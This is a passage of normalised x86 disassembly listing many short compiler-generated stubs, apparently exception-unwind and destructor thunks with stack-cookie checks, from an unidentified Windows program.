mov ecx [ ebp - 0x14 ]
add ecx 0x8
jmp sub_4035c0
sub_42ce1b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42ce40
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x1c ]
push ecx
call sub_401040
add esp 0x8
retn
sub_42ce51
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42ce70
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42ce90
lea ecx [ ebp - 0x60 ]
jmp sub_4026e0
sub_42ce98
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x64 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42cec0
lea ecx [ ebp - 0x34 ]
jmp sub_4026e0
sub_42cec8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42cef0
lea ecx [ ebp + 0x8 ]
jmp sub_4026e0
sub_42cef8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42cf20
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42cf40
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42cf60
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42cf80
mov eax [ ebp - 0x4c ]
push eax
call sub_41a0d6
pop ecx
retn
sub_42cf8b
lea ecx [ ebp - 0x48 ]
jmp sub_401900
sub_42cf93
lea ecx [ ebp - 0x2c ]
jmp sub_401900
sub_42cf9b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4c ]
xor ecx eax
call sub_41ac09
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42cfc0
lea ecx [ ebp + 0x8 ]
jmp sub_412e20
sub_42cfc8
lea ecx [ ebp - 0x1c ]
jmp sub_412e20
sub_42cfd0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42cff0
lea ecx [ ebp + 0x8 ]
jmp sub_412e20
sub_42cff8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42d020
mov eax [ ebp - 0x20 ]
push eax
call sub_41a0d6
pop ecx
retn
sub_42d02b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42d050
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_401040
add esp 0x8
retn
sub_42d061
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42d080
mov eax [ ebp - 0x24 ]
push eax
call sub_41a0d6
pop ecx
retn
sub_42d08b
lea ecx [ ebp - 0x1c ]
jmp sub_412e20
sub_42d093
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42d0b0
lea ecx [ ebp - 0x24 ]
jmp sub_412e20
sub_42d0b8
lea ecx [ ebp - 0x2c ]
jmp sub_412e20
sub_42d0c0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x3c ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42d0e0
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_401040
add esp 0x8
retn
sub_42d0f1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42d110
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42d130
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42d150
lea ecx [ ebp + 0x8 ]
jmp sub_4026e0
sub_42d158
mov eax [ ebp - 0x18 ]
push eax
call sub_41a0d6
pop ecx
retn
sub_42d163
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42d180
lea ecx [ ebp - 0x40 ]
jmp sub_4048e0
sub_42d188
lea ecx [ ebp - 0x30 ]
jmp sub_412e20
sub_42d190
mov eax [ ebp - 0x20 ]
push eax
call sub_41a0d6
pop ecx
retn
sub_42d19b
lea ecx [ ebp - 0x24 ]
jmp sub_412e20
sub_42d1a3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x44 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42d1c0
lea ecx [ ebp - 0x40 ]
jmp sub_4026e0
sub_42d1c8
lea ecx [ ebp - 0x2c ]
jmp sub_401900
sub_42d1d0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4c ]
xor ecx eax
call sub_41ac09
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42d200
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_401040
add esp 0x8
retn
sub_42d211
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42d230
lea ecx [ ebp - 0x28 ]
jmp sub_4026e0
sub_42d238
mov eax [ ebp - 0x14 ]
push eax
call sub_41a0d6
pop ecx
retn
sub_42d243
lea ecx [ ebp - 0x3c ]
jmp sub_4026e0
sub_42d24b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x40 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42d270
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42d290
mov ecx [ ebp - 0x70 ]
jmp sub_402df0
sub_42d298
mov ecx [ ebp - 0x70 ]
add ecx 0x24
jmp sub_4035c0
sub_42d2a3
mov ecx [ ebp - 0x70 ]
add ecx 0x38
jmp sub_4035c0
sub_42d2ae
mov ecx [ ebp - 0x70 ]
add ecx 0x4c
jmp sub_405dc0
sub_42d2b9
mov eax [ ebp - 0x64 ]
push eax
call sub_41a0d6
pop ecx
retn
sub_42d2c4
mov eax [ ebp - 0x68 ]
push eax
call sub_41a0d6
pop ecx
retn
sub_42d2cf
mov eax [ ebp - 0x68 ]
push eax
call sub_41a0d6
pop ecx
retn
sub_42d2da
mov eax [ ebp - 0x68 ]
push eax
call sub_41a0d6
pop ecx
retn
sub_42d2e5
mov eax [ ebp - 0x68 ]
push eax
call sub_41a0d6
pop ecx
retn
sub_42d2f0
mov eax [ ebp - 0x68 ]
push eax
call sub_41a0d6
pop ecx
retn
sub_42d2fb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x74 ]
xor ecx eax
call sub_41ac09
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42d320
mov ecx [ ebp - 0x10 ]
jmp sub_402df0
sub_42d328
mov ecx [ ebp - 0x10 ]
add ecx 0x24
jmp sub_4035c0
sub_42d333
mov ecx [ ebp - 0x10 ]
add ecx 0x38
jmp sub_4035c0
sub_42d33e
mov ecx [ ebp - 0x10 ]
add ecx 0x4c
jmp sub_405dc0
sub_42d349
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42d370
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x10 ]
push ecx
call sub_401040
add esp 0x8
retn
sub_42d381
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x10 ]
push ecx
call sub_401040
add esp 0x8
retn
sub_42d392
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42d3b0
lea ecx [ ebp - 0x34 ]
jmp sub_4026e0
sub_42d3b8
lea ecx [ ebp - 0x20 ]
jmp sub_4026e0
sub_42d3c0
lea ecx [ ebp - 0x48 ]
jmp sub_4026e0
sub_42d3c8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x48 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42d3f0
lea ecx [ ebp + 0x8 ]
jmp sub_412e20
sub_42d3f8
lea ecx [ ebp - 0x2c ]
jmp sub_4026e0
sub_42d400
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x44 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42d420
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42d440
lea ecx [ ebp + 0x8 ]
jmp sub_401900
sub_42d448
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42d470
lea ecx [ ebp + 0x8 ]
jmp sub_401900
sub_42d478
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42d4a0
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x14 ]
push ecx
call sub_401040
add esp 0x8
retn
sub_42d4b1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42d4d0
lea ecx [ ebp - 0x48 ]
jmp sub_4031f0
sub_42d4d8
lea ecx [ ebp - 0x2c ]
jmp sub_4031f0
sub_42d4e0
lea ecx [ ebp - 0xa8 ]
jmp sub_4031f0
sub_42d4eb
lea ecx [ ebp - 0x48 ]
jmp sub_4031f0
sub_42d4f3
lea ecx [ ebp - 0x64 ]
jmp sub_4031f0
sub_42d4fb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xac ]
xor ecx eax
call sub_41ac09
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42d530
lea ecx [ ebp + 0xc ]
jmp sub_401900
sub_42d538
lea ecx [ ebp - 0x250 ]
jmp sub_401900
sub_42d543
lea ecx [ ebp - 0x234 ]
jmp sub_401900
sub_42d54e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x258 ]
xor ecx eax
call sub_41ac09
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42d580
mov ecx [ ebp - 0x10 ]
jmp sub_406f30
sub_42d588
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42d5b0
mov ecx [ ebp - 0x10 ]
jmp sub_402df0
sub_42d5b8
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp sub_401900
sub_42d5c3
mov ecx [ ebp - 0x10 ]
add ecx 0x2c
jmp sub_4083e0
sub_42d5ce
mov ecx [ ebp - 0x14 ]
jmp sub_406f30
sub_42d5d6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42d600
mov ecx [ ebp - 0x14 ]
jmp sub_402df0
sub_42d608
mov ecx [ ebp - 0x14 ]
add ecx 0xc
jmp sub_401900
sub_42d613
mov ecx [ ebp - 0x14 ]
add ecx 0x2c
jmp sub_4083e0
sub_42d61e
mov eax [ ebp - 0x10 ]
push eax
call sub_41a0d6
pop ecx
retn
sub_42d629
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42d650
mov eax [ ebp - 0x3c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x3c ] 0xfffffffe
mov ecx [ ebp - 0x38 ]
jmp sub_402660
sub_42d669
lea ecx [ ebp - 0x2c ]
jmp sub_401900
sub_42d671
lea ecx [ ebp - 0x2c ]
jmp sub_401900
sub_42d679
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x40 ]
xor ecx eax
call sub_41ac09
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42d6a0
mov eax [ ebp - 0x430 ]
push eax
call sub_41a0d6
pop ecx
retn
sub_42d6ae
lea ecx [ ebp - 0x444 ]
jmp sub_402660
sub_42d6b9
lea ecx [ ebp - 0x234 ]
jmp sub_401900
sub_42d6c4
lea ecx [ ebp - 0x250 ]
jmp sub_401900
sub_42d6cf
mov ecx [ ebp - 0x430 ]
jmp sub_401900
sub_42d6da
mov ecx [ ebp - 0x430 ]
jmp sub_401900
sub_42d6e5
lea ecx [ ebp - 0x2f8 ]
jmp sub_401900
sub_42d6f0
lea ecx [ ebp - 0x3d8 ]
jmp sub_401900
sub_42d6fb
lea ecx [ ebp - 0x444 ]
jmp sub_402660
sub_42d706
lea ecx [ ebp - 0x234 ]
jmp sub_401900
sub_42d711
lea ecx [ ebp - 0x250 ]
jmp sub_401900
sub_42d71c
mov ecx [ ebp - 0x430 ]
jmp sub_401900
sub_42d727
mov ecx [ ebp - 0x430 ]
jmp sub_401900
sub_42d732
lea ecx [ ebp - 0x3a0 ]
jmp sub_401900
sub_42d73d
lea ecx [ ebp - 0x410 ]
jmp sub_401900
sub_42d748
lea ecx [ ebp - 0x444 ]
jmp sub_402660
sub_42d753
lea ecx [ ebp - 0x250 ]
jmp sub_401900
sub_42d75e
lea ecx [ ebp - 0x314 ]
jmp sub_401900
sub_42d769
lea ecx [ ebp - 0x330 ]
jmp sub_401900
sub_42d774
lea ecx [ ebp - 0x234 ]
jmp sub_401900
sub_42d77f
lea ecx [ ebp - 0x2a4 ]
jmp sub_401900
sub_42d78a
lea ecx [ ebp - 0x2dc ]
jmp sub_401900
sub_42d795
lea ecx [ ebp - 0x2c0 ]
jmp sub_401900
sub_42d7a0
lea ecx [ ebp - 0x3bc ]
jmp sub_401900
sub_42d7ab
lea ecx [ ebp - 0x444 ]
jmp sub_402660
sub_42d7b6
lea ecx [ ebp - 0x234 ]
jmp sub_401900
sub_42d7c1
lea ecx [ ebp - 0x250 ]
jmp sub_401900
sub_42d7cc
mov ecx [ ebp - 0x430 ]
jmp sub_401900
sub_42d7d7
mov ecx [ ebp - 0x430 ]
jmp sub_401900
sub_42d7e2
lea ecx [ ebp - 0x3f4 ]
jmp sub_401900
sub_42d7ed
lea ecx [ ebp - 0x42c ]
jmp sub_401900
sub_42d7f8
lea ecx [ ebp - 0x454 ]
jmp sub_402660
sub_42d803
lea ecx [ ebp - 0x26c ]
jmp sub_401900
sub_42d80e
lea ecx [ ebp - 0x288 ]
jmp sub_401900
sub_42d819
mov ecx [ ebp - 0x430 ]
jmp sub_401900
sub_42d824
mov ecx [ ebp - 0x430 ]
jmp sub_401900
sub_42d82f
mov ecx [ ebp - 0x430 ]
jmp sub_401900
sub_42d83a
mov ecx [ ebp - 0x430 ]
jmp sub_401900
sub_42d845
lea ecx [ ebp - 0x368 ]
jmp sub_401900
sub_42d850
lea ecx [ ebp - 0x34c ]
jmp sub_401900
sub_42d85b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x458 ]
xor ecx eax
call sub_41ac09
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42d890
lea ecx [ ebp - 0x24 ]
jmp sub_412e20
sub_42d898
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x40 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42d8c0
mov eax [ ebp - 0x10 ]
push eax
call sub_41a0d6
pop ecx
retn
sub_42d8cb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42d8f0
mov ecx [ ebp - 0x14 ]
add ecx 0x4
jmp sub_419df1
sub_42d8fb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42d920
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42d940
mov ecx [ ebp - 0x10 ]
jmp sub_4197b1
sub_42d948
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_40a670
sub_42d953
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp sub_40a670
sub_42d95e
mov ecx [ ebp - 0x10 ]
add ecx 0x14
jmp sub_40a670
sub_42d969
mov ecx [ ebp - 0x10 ]
add ecx 0x1c
jmp sub_40a670
sub_42d974
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42d990
mov ecx [ ebp - 0x10 ]
jmp sub_4197b1
sub_42d998
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_40a670
sub_42d9a3
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp sub_40a670
sub_42d9ae
mov ecx [ ebp - 0x10 ]
add ecx 0x14
jmp sub_40a670
sub_42d9b9
mov ecx [ ebp - 0x10 ]
add ecx 0x1c
jmp sub_40a670
sub_42d9c4
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42d9e0
mov eax [ ebp - 0x10 ]
push eax
call sub_41a0d6
pop ecx
retn
sub_42d9eb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x44 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42da10
mov ecx [ ebp - 0x10 ]
sub ecx 0x48
jmp sub_40a120
sub_42da1b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42da40
lea ecx [ ebp - 0x18 ]
jmp sub_4197b1
sub_42da48
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42da70
mov eax [ ebp - 0x10 ]
push eax
call sub_41a0d6
pop ecx
retn
sub_42da7b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42daa0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42dac0
lea ecx [ ebp - 0x10 ]
jmp sub_40a040
sub_42dac8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42daf0
mov eax [ ebp - 0x14 ]
push eax
call sub_41a0d6
pop ecx
retn
sub_42dafb
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
lea ecx [ ebp - 0x38 ]
jmp sub_40b3d0
sub_42db14
mov ecx [ ebp - 0x14 ]
jmp sub_40a030
sub_42db1c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42db40
mov ecx [ ebp - 0x10 ]
jmp sub_40a1b0
sub_42db48
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42db70
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42db90
lea ecx [ ebp + 0x28 ]
jmp sub_4031f0
sub_42db98
lea ecx [ ebp + 0xc ]
jmp sub_4031f0
sub_42dba0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42dbc0
lea ecx [ ebp - 0x2c ]
jmp sub_40a1b0
sub_42dbc8
lea ecx [ ebp - 0x2c ]
jmp sub_40c320
sub_42dbd0
lea ecx [ ebp - 0x1c ]
jmp sub_40a040
sub_42dbd8
lea ecx [ ebp - 0x2c ]
jmp sub_40a1b0
sub_42dbe0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42dc00
lea ecx [ ebp - 0x2c ]
jmp sub_4031f0
sub_42dc08
lea ecx [ ebp - 0x2c ]
jmp sub_4031f0
sub_42dc10
lea ecx [ ebp - 0x48 ]
jmp sub_4031f0
sub_42dc18
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x50 ]
xor ecx eax
call sub_41ac09
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42dc40
lea ecx [ ebp - 0x58 ]
jmp sub_40a040
sub_42dc48
lea ecx [ ebp - 0x2c ]
jmp sub_4031f0
sub_42dc50
lea ecx [ ebp - 0x48 ]
jmp sub_4031f0
sub_42dc58
lea ecx [ ebp - 0x48 ]
jmp sub_4031f0
sub_42dc60
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x6c ]
xor ecx eax
call sub_41ac09
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42dc90
lea ecx [ ebp - 0x70 ]
jmp sub_40a040
sub_42dc98
lea ecx [ ebp - 0x48 ]
jmp sub_4031f0
sub_42dca0
lea ecx [ ebp - 0x2c ]
jmp sub_4031f0
sub_42dca8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x88 ]
xor ecx eax
call sub_41ac09
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42dcd0
lea ecx [ ebp - 0x40 ]
jmp sub_40a040
sub_42dcd8
lea ecx [ ebp - 0x2c ]
jmp sub_4031f0
sub_42dce0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x58 ]
xor ecx eax
call sub_41ac09
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42dd10
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x8 ]
jmp sub_4031f0
sub_42dd29
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42dd50
mov eax [ ebp - 0x88 ]
push eax
call sub_41a0d6
pop ecx
retn
sub_42dd5e
lea ecx [ ebp - 0x2c ]
jmp sub_401900
sub_42dd66
lea ecx [ ebp - 0x80 ]
jmp sub_4031f0
sub_42dd6e
lea ecx [ ebp - 0x2c ]
jmp sub_4031f0
sub_42dd76
lea ecx [ ebp - 0x48 ]
jmp sub_4031f0
sub_42dd7e
lea ecx [ ebp - 0x64 ]
jmp sub_4031f0
sub_42dd86
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x94 ]
xor ecx eax
call sub_41ac09
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42ddb0
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp - 0x14 ]
add ecx 0x60
jmp sub_40a100
sub_42ddcc
mov ecx [ ebp - 0x14 ]
add ecx 0x10
jmp sub_40a110
sub_42ddd7
mov ecx [ ebp - 0x14 ]
add ecx 0x18
jmp sub_40a120
sub_42dde2
mov ecx [ ebp - 0x18 ]
jmp sub_40a690
sub_42ddea
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42de10
lea ecx [ ebp - 0x80 ]
jmp sub_4031f0
sub_42de18
mov eax [ ebp - 0xa0 ]
push eax
call sub_41a0d6
pop ecx
retn
sub_42de26
lea ecx [ ebp - 0x2c ]
jmp sub_401900
sub_42de2e
lea ecx [ ebp - 0x9c ]
jmp sub_4031f0
sub_42de39
lea ecx [ ebp - 0x64 ]
jmp sub_401900
sub_42de41
lea ecx [ ebp - 0x64 ]
jmp sub_4031f0
sub_42de49
lea ecx [ ebp - 0x48 ]
jmp sub_4031f0
sub_42de51
mov ecx [ ebp - 0xa0 ]
jmp sub_4031f0
sub_42de5c
mov ecx [ ebp - 0xa8 ]
jmp sub_4031f0
sub_42de67
mov ecx [ ebp - 0xa8 ]
jmp sub_4031f0
sub_42de72
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xb0 ]
xor ecx eax
call sub_41ac09
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42dea0
mov eax [ ebp - 0x1f8 ]
push eax
call sub_41a0d6
pop ecx
retn
sub_42deae
lea ecx [ ebp - 0x200 ]
jmp sub_412e20
sub_42deb9
lea ecx [ ebp - 0x2c ]
jmp sub_4031f0
sub_42dec1
lea ecx [ ebp - 0x2b8 ]
jmp sub_40bec0
sub_42decc
lea ecx [ ebp - 0xb8 ]
jmp sub_4031f0
sub_42ded7
lea ecx [ ebp - 0x198 ]
jmp sub_4031f0
sub_42dee2
lea ecx [ ebp - 0x160 ]
jmp sub_4031f0
sub_42deed
lea ecx [ ebp - 0xf0 ]
jmp sub_4031f0
sub_42def8
lea ecx [ ebp - 0xd4 ]
jmp sub_4031f0
sub_42df03
lea ecx [ ebp - 0x17c ]
jmp sub_4031f0
sub_42df0e
lea ecx [ ebp - 0x144 ]
jmp sub_4031f0
sub_42df19
lea ecx [ ebp - 0x1ec ]
jmp sub_4031f0
sub_42df24
lea ecx [ ebp - 0x1b4 ]
jmp sub_4031f0
sub_42df2f
lea ecx [ ebp - 0x2c ]
jmp sub_4031f0
sub_42df37
lea ecx [ ebp - 0x80 ]
jmp sub_4031f0
sub_42df3f
lea ecx [ ebp - 0x9c ]
jmp sub_4031f0
sub_42df4a
lea ecx [ ebp - 0x128 ]
jmp sub_4031f0
sub_42df55
lea ecx [ ebp - 0x1d0 ]
jmp sub_4031f0
sub_42df60
lea ecx [ ebp - 0x10c ]
jmp sub_4031f0
sub_42df6b
lea ecx [ ebp - 0x64 ]
jmp sub_4031f0
sub_42df73
